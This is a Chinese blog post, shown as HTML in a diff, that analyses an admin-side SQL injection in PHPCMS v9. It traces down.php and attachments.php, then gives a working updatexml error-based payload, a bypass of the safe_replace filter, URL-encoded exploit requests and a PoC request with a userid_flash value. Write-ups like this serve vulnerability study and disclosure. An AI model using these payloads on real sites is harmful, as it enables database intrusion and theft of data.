@@ -1,0 +1,318 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>phpcmsv9Sql注入漏洞 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="前言phpcmsv9的sql注入漏洞 漏洞分析漏洞触发点实际上这个是一个后台的漏洞. 首先漏洞的触发点.&#x2F;phpcms&#x2F;modules&#x2F;content&#x2F;down.php::init() 12345678910111213141516171819202122232425public function init() &amp;#123;	$a_k &#x3D; trim($_GET[&#39;a_k&#39;]);	if(!isset">
+<meta property="og:type" content="article">
+<meta property="og:title" content="phpcmsv9Sql注入漏洞">
+<meta property="og:url" content="http://yoursite.com/2020/02/07/phpcmsv9Sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="前言phpcmsv9的sql注入漏洞 漏洞分析漏洞触发点实际上这个是一个后台的漏洞. 首先漏洞的触发点.&#x2F;phpcms&#x2F;modules&#x2F;content&#x2F;down.php::init() 12345678910111213141516171819202122232425public function init() &amp;#123;	$a_k &#x3D; trim($_GET[&#39;a_k&#39;]);	if(!isset">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://yoursite.com/.com//1.png">
+<meta property="og:image" content="http://yoursite.com/.com//2.png">
+<meta property="og:image" content="http://yoursite.com/.com//3.png">
+<meta property="article:published_time" content="2020-02-06T16:43:43.000Z">
+<meta property="article:modified_time" content="2020-02-07T03:31:52.000Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/.com//1.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-phpcmsv9Sql注入漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/02/07/phpcmsv9Sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2020-02-06T16:43:43.000Z" itemprop="datePublished">2020-02-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      phpcmsv9Sql注入漏洞
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>phpcmsv9的sql注入漏洞</p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="漏洞触发点"><a href="#漏洞触发点" class="headerlink" title="漏洞触发点"></a>漏洞触发点</h2><p>实际上这个是一个后台的漏洞.</p>
+<p>首先漏洞的触发点<code>./phpcms/modules/content/down.php::init()</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	$a_k = trim($_GET[<span class="string">'a_k'</span>]);</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">isset</span>($a_k)) showmessage(L(<span class="string">'illegal_parameters'</span>));</span><br><span class="line">	$a_k = sys_auth($a_k, <span class="string">'DECODE'</span>, pc_base::load_config(<span class="string">'system'</span>,<span class="string">'auth_key'</span>));</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">empty</span>($a_k)) showmessage(L(<span class="string">'illegal_parameters'</span>));</span><br><span class="line">	<span class="keyword">unset</span>($i,$m,$f);</span><br><span class="line">	parse_str($a_k);</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($i)) $i = $id = intval($i);</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">isset</span>($m)) showmessage(L(<span class="string">'illegal_parameters'</span>));</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">isset</span>($modelid)||!<span class="keyword">isset</span>($catid)) showmessage(L(<span class="string">'illegal_parameters'</span>));</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">empty</span>($f)) showmessage(L(<span class="string">'url_invalid'</span>));</span><br><span class="line">	$allow_visitor = <span class="number">1</span>;</span><br><span class="line">	$MODEL = getcache(<span class="string">'model'</span>,<span class="string">'commons'</span>);</span><br><span class="line">	$tablename = <span class="keyword">$this</span>-&gt;db-&gt;table_name = <span class="keyword">$this</span>-&gt;db-&gt;db_tablepre.$MODEL[$modelid][<span class="string">'tablename'</span>];</span><br><span class="line">	<span class="keyword">$this</span>-&gt;db-&gt;table_name = $tablename.<span class="string">'_data'</span>;</span><br><span class="line">	$rs = <span class="keyword">$this</span>-&gt;db-&gt;get_one(<span class="keyword">array</span>(<span class="string">'id'</span>=&gt;$id));	</span><br><span class="line">	$siteids = getcache(<span class="string">'category_content'</span>,<span class="string">'commons'</span>);</span><br><span class="line">	$siteid = $siteids[$catid];</span><br><span class="line">	$CATEGORYS = getcache(<span class="string">'category_content_'</span>.$siteid,<span class="string">'commons'</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">$this</span>-&gt;category = $CATEGORYS[$catid];</span><br><span class="line">	<span class="keyword">$this</span>-&gt;category_setting = string2array(<span class="keyword">$this</span>-&gt;category[<span class="string">'setting'</span>]);</span><br><span class="line">	...</span><br><span class="line">	...</span><br><span class="line">	...</span><br></pre></td></tr></table></figure>
+
+<p><code>$a_k</code>由GET请求获得.<code>$a_k</code>要解密,所以说<code>$a_k</code>是一段密文.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$a_k = sys_auth($a_k, <span class="string">'DECODE'</span>, pc_base::load_config(<span class="string">'system'</span>,<span class="string">'auth_key'</span>));</span><br></pre></td></tr></table></figure>
+
+<p>然后<code>$a_k</code>经过<code>parse_str()</code>获得<code>$i,$m,$modelid,$catid,$f,$id</code></p>
+<p>其中关键代码:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$rs = <span class="keyword">$this</span>-&gt;db-&gt;get_one(<span class="keyword">array</span>(<span class="string">'id'</span>=&gt;$id));</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_one</span><span class="params">($where = <span class="string">''</span>, $data = <span class="string">'*'</span>, $order = <span class="string">''</span>, $group = <span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (is_array($where)) $where = <span class="keyword">$this</span>-&gt;sqls($where);</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;db-&gt;get_one($data, <span class="keyword">$this</span>-&gt;table_name, $where, $order, $group);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sqls</span><span class="params">($where, $font = <span class="string">' AND '</span>)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (is_array($where)) &#123;</span><br><span class="line">		$sql = <span class="string">''</span>;</span><br><span class="line">		<span class="keyword">foreach</span> ($where <span class="keyword">as</span> $key=&gt;$val) &#123;</span><br><span class="line">			$sql .= $sql ? <span class="string">" $font `$key` = '$val' "</span> : <span class="string">" `$key` = '$val'"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> $sql;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> $where;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>select * from where  id= &#39;xxx&#39;</code>单引号字符型注入.</p>
+<p>payload如下:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=%<span class="number">27</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">1</span>,user())),<span class="number">1</span>)<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>根据<code>$id</code>进行查查询,返回结果.在这里没有进行字符串的过滤,所以存在一定的sql注入漏洞.</p>
+<p>那么这个漏洞的触发方式:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?m=content&amp;c=down&amp;a=init&amp;a_k=密文</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h2><p>定位到:<code>./phpcms/modules/attachement/attachements.php::swfupload_json()</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">defined(<span class="string">'IN_PHPCMS'</span>) <span class="keyword">or</span> <span class="keyword">exit</span>(<span class="string">'No permission resources.'</span>); </span><br><span class="line">$session_storage = <span class="string">'session_'</span>.pc_base::load_config(<span class="string">'system'</span>,<span class="string">'session_storage'</span>);</span><br><span class="line">pc_base::load_sys_class($session_storage);</span><br><span class="line"><span class="keyword">if</span>(param::get_cookie(<span class="string">'sys_lang'</span>)) &#123;</span><br><span class="line">	define(<span class="string">'SYS_STYLE'</span>,param::get_cookie(<span class="string">'sys_lang'</span>));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	define(<span class="string">'SYS_STYLE'</span>,<span class="string">'zh-cn'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">attachments</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> $att_db;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		pc_base::load_app_func(<span class="string">'global'</span>);</span><br><span class="line">		<span class="keyword">$this</span>-&gt;upload_url = pc_base::load_config(<span class="string">'system'</span>,<span class="string">'upload_url'</span>);</span><br><span class="line">		<span class="keyword">$this</span>-&gt;upload_path = pc_base::load_config(<span class="string">'system'</span>,<span class="string">'upload_path'</span>);		</span><br><span class="line">		<span class="keyword">$this</span>-&gt;imgext = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'gif'</span>,<span class="string">'png'</span>,<span class="string">'bmp'</span>,<span class="string">'jpeg'</span>);</span><br><span class="line">		<span class="keyword">$this</span>-&gt;userid = $_SESSION[<span class="string">'userid'</span>] ? $_SESSION[<span class="string">'userid'</span>] : (param::get_cookie(<span class="string">'_userid'</span>) ? param::get_cookie(<span class="string">'_userid'</span>) : sys_auth($_POST[<span class="string">'userid_flash'</span>],<span class="string">'DECODE'</span>));</span><br><span class="line">		<span class="keyword">$this</span>-&gt;isadmin = <span class="keyword">$this</span>-&gt;admin_username = $_SESSION[<span class="string">'roleid'</span>] ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;groupid = param::get_cookie(<span class="string">'_groupid'</span>) ? param::get_cookie(<span class="string">'_groupid'</span>) : <span class="number">8</span>;</span><br><span class="line">		<span class="comment">//判断是否登录</span></span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;userid))&#123;</span><br><span class="line">			showmessage(L(<span class="string">'please_login'</span>,<span class="string">''</span>,<span class="string">'member'</span>));</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">   ...</span><br><span class="line">       ...</span><br><span class="line">   ...</span><br><span class="line">       ...</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 设置swfupload上传的json格式cookie</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">swfupload_json</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		$arr[<span class="string">'aid'</span>] = intval($_GET[<span class="string">'aid'</span>]);</span><br><span class="line">		$arr[<span class="string">'src'</span>] = safe_replace(trim($_GET[<span class="string">'src'</span>]));</span><br><span class="line">		$arr[<span class="string">'filename'</span>] = urlencode(safe_replace($_GET[<span class="string">'filename'</span>]));</span><br><span class="line">		$json_str = json_encode($arr);</span><br><span class="line">		$att_arr_exist = param::get_cookie(<span class="string">'att_json'</span>);</span><br><span class="line">		$att_arr_exist_tmp = explode(<span class="string">'||'</span>, $att_arr_exist);</span><br><span class="line">		<span class="keyword">if</span>(is_array($att_arr_exist_tmp) &amp;&amp; in_array($json_str, $att_arr_exist_tmp)) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			$json_str = $att_arr_exist ? $att_arr_exist.<span class="string">'||'</span>.$json_str : $json_str;</span><br><span class="line">			param::set_cookie(<span class="string">'att_json'</span>,$json_str);</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">true</span>;			</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">    ...</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure>
+
+<p>在<code>swfupload_json()</code>中通过GET请求,分别获得<code>aid,src,filename</code>,经过<code>json加密</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$json_str = json_encode($arr);</span><br></pre></td></tr></table></figure>
+
+
+
+<p>判断是否已有<code>cookie</code>,由于未有cookie,所以在这里我们设置cookie.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$att_arr_exist = param::get_cookie(<span class="string">'att_json'</span>);</span><br><span class="line">$att_arr_exist_tmp = explode(<span class="string">'||'</span>, $att_arr_exist);</span><br><span class="line"><span class="keyword">if</span>(is_array($att_arr_exist_tmp) &amp;&amp; in_array($json_str, $att_arr_exist_tmp)) &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	$json_str = $att_arr_exist ? $att_arr_exist.<span class="string">'||'</span>.$json_str : $json_str;</span><br><span class="line">	param::set_cookie(<span class="string">'att_json'</span>,$json_str);</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">true</span>;			</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>然后跟进<code>set_cookie()</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">set_cookie</span><span class="params">($var, $value = <span class="string">''</span>, $time = <span class="number">0</span>)</span> </span>&#123;</span><br><span class="line">	$time = $time &gt; <span class="number">0</span> ? $time : ($value == <span class="string">''</span> ? SYS_TIME - <span class="number">3600</span> : <span class="number">0</span>);</span><br><span class="line">	$s = $_SERVER[<span class="string">'SERVER_PORT'</span>] == <span class="string">'443'</span> ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">	$var = pc_base::load_config(<span class="string">'system'</span>,<span class="string">'cookie_pre'</span>).$var;</span><br><span class="line">	$_COOKIE[$var] = $value;</span><br><span class="line">	<span class="keyword">if</span> (is_array($value)) &#123;</span><br><span class="line">		<span class="keyword">foreach</span>($value <span class="keyword">as</span> $k=&gt;$v) &#123;</span><br><span class="line">			setcookie($var.<span class="string">'['</span>.$k.<span class="string">']'</span>, sys_auth($v, <span class="string">'ENCODE'</span>), $time, pc_base::load_config(<span class="string">'system'</span>,<span class="string">'cookie_path'</span>), pc_base::load_config(<span class="string">'system'</span>,<span class="string">'cookie_domain'</span>), $s);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		setcookie($var, sys_auth($value, <span class="string">'ENCODE'</span>), $time, pc_base::load_config(<span class="string">'system'</span>,<span class="string">'cookie_path'</span>), pc_base::load_config(<span class="string">'system'</span>,<span class="string">'cookie_domain'</span>), $s);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里使用的加密函数<code>sys_auth(xxx,ENCODE)</code>与解密<code>$a_k</code>的<code>sys_auth($a_k, &#39;DECODE&#39;, pc_base::load_config(&#39;system&#39;,&#39;auth_key&#39;))</code>函数是同一个函数</p>
+<p>所以可以在这里生成密文.<code>$_GET[src]</code>可以作为写入payload的地方.只经过<code>safe_replace()</code>函数.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 安全过滤函数</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> $string</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_replace</span><span class="params">($string)</span> </span>&#123;</span><br><span class="line">	$string = str_replace(<span class="string">'%20'</span>,<span class="string">''</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">'%27'</span>,<span class="string">''</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">'%2527'</span>,<span class="string">''</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">'*'</span>,<span class="string">''</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">'"'</span>,<span class="string">'&amp;quot;'</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">"'"</span>,<span class="string">''</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">'"'</span>,<span class="string">''</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">';'</span>,<span class="string">''</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">'&lt;'</span>,<span class="string">'&amp;lt;'</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">'&gt;'</span>,<span class="string">'&amp;gt;'</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">"&#123;"</span>,<span class="string">''</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">'&#125;'</span>,<span class="string">''</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">'\\'</span>,<span class="string">''</span>,$string);</span><br><span class="line">	<span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>构造payload为</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=&amp;id=%*27 and updatexml(1,concat(1,user())),1)#&amp;m=1&amp;modelid=1&amp;catid=1&amp;f=cookie&amp;</span><br></pre></td></tr></table></figure>
+
+<p>在构造payload时不要<code>$i</code>这项,否则将会由于以下代码,payload失效.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($i)) $i = $id = intval($i);</span><br></pre></td></tr></table></figure>
+
+<p>为绕过<code>safe_replace()</code>,修改paylaod如下:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=&amp;id=%*27 and updatexml(1,concat(1,user())),1)#&amp;m=1&amp;modelid=1&amp;catid=1&amp;f=cookie&amp;</span><br></pre></td></tr></table></figure>
+
+<p>经过url编码:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id%3d%25*27%20and%20updatexml(1%2cconcat(1%2cuser()))%2c1)%23%26m%3d1%26modelid%3d1%26catid%3d1%26f%3dcookie%26</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>在attachments.php中有这么一段代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">		<span class="keyword">$this</span>-&gt;userid = $_SESSION[<span class="string">'userid'</span>] ? $_SESSION[<span class="string">'userid'</span>] : (param::get_cookie(<span class="string">'_userid'</span>) ? param::get_cookie(<span class="string">'_userid'</span>) : sys_auth($_POST[<span class="string">'userid_flash'</span>],<span class="string">'DECODE'</span>));</span><br><span class="line">... ... ...</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;userid))&#123;</span><br><span class="line">			showmessage(L(<span class="string">'please_login'</span>,<span class="string">''</span>,<span class="string">'member'</span>));</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里需要认证,认证是否为管理员用户登录</p>
+<p>获得userid_flash的方法</p>
+<p>定位<code>./phpcms/modules/wap/index.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">index</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;		</span><br><span class="line">		<span class="keyword">$this</span>-&gt;db = pc_base::load_model(<span class="string">'content_model'</span>);</span><br><span class="line">		<span class="keyword">$this</span>-&gt;siteid = <span class="keyword">isset</span>($_GET[<span class="string">'siteid'</span>]) &amp;&amp; (intval($_GET[<span class="string">'siteid'</span>]) &gt; <span class="number">0</span>) ? intval(trim($_GET[<span class="string">'siteid'</span>])) : (param::get_cookie(<span class="string">'siteid'</span>) ? param::get_cookie(<span class="string">'siteid'</span>) : <span class="number">1</span>);</span><br><span class="line">		param::set_cookie(<span class="string">'siteid'</span>,<span class="keyword">$this</span>-&gt;siteid);	</span><br><span class="line">		<span class="keyword">$this</span>-&gt;wap_site = getcache(<span class="string">'wap_site'</span>,<span class="string">'wap'</span>);</span><br><span class="line">		<span class="keyword">$this</span>-&gt;types = getcache(<span class="string">'wap_type'</span>,<span class="string">'wap'</span>);</span><br><span class="line">		<span class="keyword">$this</span>-&gt;wap = <span class="keyword">$this</span>-&gt;wap_site[<span class="keyword">$this</span>-&gt;siteid];</span><br><span class="line">		define(<span class="string">'WAP_SITEURL'</span>, <span class="keyword">$this</span>-&gt;wap[<span class="string">'domain'</span>] ? <span class="keyword">$this</span>-&gt;wap[<span class="string">'domain'</span>].<span class="string">'index.php?'</span> : APP_PATH.<span class="string">'index.php?m=wap&amp;siteid='</span>.<span class="keyword">$this</span>-&gt;siteid);</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;wap[<span class="string">'status'</span>]!=<span class="number">1</span>) <span class="keyword">exit</span>(L(<span class="string">'wap_close_status'</span>));</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/.com//1.png" alt="1581073053853"></p>
+<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><p>生成密文:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id%3d%25*27+and+updatexml(1%2cconcat(1%2c(user()))%2c1)%23%26m%3d1%26f%3dcookie%26modelid%3d1%26catid%3d1%26</span><br><span class="line"></span><br><span class="line">POST:userid_flash=369b_CwjZql56-b8HtNPMGzWLTEj3sQF4h1VLxYY</span><br></pre></td></tr></table></figure>
+
+<p><img src="/.com//2.png" alt="1581074961288"></p>
